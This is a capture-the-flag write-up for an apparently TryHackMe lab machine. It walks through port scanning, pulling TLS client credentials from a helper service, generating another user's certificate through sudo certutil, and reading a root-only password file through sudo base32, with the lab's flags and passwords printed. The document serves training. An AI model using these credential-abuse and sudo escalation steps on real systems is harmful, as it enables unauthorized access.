<hr>
<h2> Question 1: flag 1</h2>
I already got some hints from the details in the tryhackme page<br>

```
He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
```

So lets start, nmap scan as usual recon:
```
$ nmap 10.10.246.196
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 15:17 EDT
Nmap scan report for 10.10.246.196
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9009/tcp open  pichat

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

Trying Port 9009 in broweser, it returned 

```Unsupported or unrecognized SSL message```

<br>

So as i know if i try to load up the web server on port 80, <br>
it will redirect me to port 4040 <br>
On the website Barney doesn't seems to know what he is doing, and he also mentions
that: **"Looks like it started something else, but I'm not sure how to turn it off!
        He said it was from the toilet and OVER 9000!"**<br>


So there are more ports open than what i currently have<br>
Running nmap again reveals another port that i didnt knew about, **54321**
```
$ nmap 10.10.246.196 -p-65535
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 15:21 EDT
Nmap scan report for 10.10.246.196
Host is up (0.061s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4040/tcp  open  yo-main
9009/tcp  open  pichat
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.12 seconds

```
Trying port **54321** returned ```Error: 'undefined' is not authorized for access.```
<br>
<br>
After some messing around, turns out i can connect to port 9009 via netcat:
```
$ ncat 10.10.246.196 9009 


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? 
```
Im looking for flags and passwords!
```
Sorry, unrecognized request: 'password'
You use this service to recover your client certificate and private key
```
The output message says i can recover certificate and a private key
```
What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----


What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...
-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----

```
Okay, i can use this key and certificate via openssl like this(guessing port 54321 because the 9009 didn't worked):
```
openssl s_client -connect 10.10.246.196:54321 -key id_rsa -cert certificate 
```
And after connection, i was able to get Barney's password:
```
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> 
Unrecognized command: ''
This service is for login and password hints
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```
I have no other choice than trying this password via ssh
```
$ ssh barney@10.10.246.196
[...]
barney@10.10.246.196's password: 
barney@ip-10-10-246-196:~$ 
```
Good, now i have the first flag!
```
barney@ip-10-10-246-196:~$ cat barney.txt
THM{f05780f08f0eb1de65023069d0e4c90c}
```
<hr>
<h2> Question 2: Fred's password</h2>
Following the tasks, i have to get access to freds account, and from fred's account, to root!

Executing sudo -l command, returned that i can run certutil as root without password:
```
barney@ip-10-10-246-196:~$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on ip-10-10-246-196:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on ip-10-10-246-196:
    (ALL : ALL) /usr/bin/certutil
```
Checking the tool usage, i can generate new keypair for users
```
barney@ip-10-10-246-196:~$ certutil
Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```
This gave me an idea to probably do the same as with Barney's account, creating a TLS connection using the two keys?
```
barney@ip-10-10-246-196:~$ sudo certutil fred fred
Generating credentials for user: fred (fred)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----
```
Saving the output to files and trying the connection:
```
$ openssl s_client -connect 10.10.246.196:54321 -cert certificate -key id_rsa
Connecting to 10.10.246.196
CONNECTED(00000003)
[...]
read R BLOCK
Welcome: 'fred' is authorized.
```
And typing help again, it will show freds account password:
```
b3dr0ck> help
Password hint: **YabbaDabbaD0000!** (user = 'fred')
```
We got Fred's account password, and also the answer to question 2!
```
$ ssh fred@10.10.246.196
fred@10.10.246.196's password: 
fred@ip-10-10-246-196:~$ 
```
<hr>
<h2> Question 3: flag 2</h2>

And now i can easly get the second flag too!
```
fred@ip-10-10-246-196:~$ cat fred.txt
THM{08da34e619da839b154521da7323559d}
```
<hr>
<h2> Question 4: flag 3(root)</h2>
Trying again some basic PE mehtods, executing sudo -l command returns that i can run base64 and base32 as root for a specific file

```
fred@ip-10-10-246-196:~$ sudo -l
Matching Defaults entries for fred on ip-10-10-246-196:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-10-246-196:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
Both command will read the file and encodes it as base64/32<br>
Probably it has the password encoded as base64 or base32<br>
```
fred@ip-10-10-246-196:~$ sudo /usr/bin/base32 /root/pass.txt
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
```
Trying with CyberChef, i decoded from base32 to text, but the output looks like its still encoded
<img src = "cyberchef1.png">
<br>
Its probably double, or triple encoded by base64/32
<br><br>
After trying for a while, it turns out we can decode it two times with base32 and once with base64, this finally gave me an MD5 hash<br>
```Base32 -> Base32 -> Base64 -> MD5```
<img src = "cyberchef2.png">
<br><br>
Lets try cracking the MD5 hash with CrackStation!
<img src = "crackstation.png">
<br>
Successful! Lets hope this is the root password

```
fred@ip-10-10-246-196:~$ su - root
Password: 
root@ip-10-10-246-196:~# 
```
Victory! Lets read the root.txt!
```
root@ip-10-10-246-196:~# cat /root/root.txt
THM{de4043c009214b56279982bf10a661b7}
```
